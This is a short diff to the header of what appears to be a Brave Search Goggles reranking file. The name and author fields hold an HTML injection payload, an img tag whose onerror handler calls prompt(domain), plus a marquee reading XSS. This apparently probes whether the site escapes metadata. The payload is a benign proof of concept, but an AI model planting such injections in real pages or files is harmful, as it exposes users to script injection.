@@ -1,7 +1,7 @@
-! name: Tech blogs<img src=x onerror=prompt(domain)><h1><marquee>XSS</marquee></h1>
-! description: Rerank<s>dd</s> results to boost content on tech blogs. List of tech blogs drawn from several sources (blogsurf.io, refined.blog, et al), and not vetted or endorsed by Brave.
+! name: test<img src=x onerror=prompt(domain)><h1><marquee>XSS</marquee></h1>
+! description: Rtest http://thomasg.fr/
 ! public: true
-! author: Goggles 101<s>dd</s>
+! author: Goggles<img src=x onerror=prompt(domain)><h1><marquee>XSS</marquee></h1>
 ! avatar: #9244e0
 
 $discard
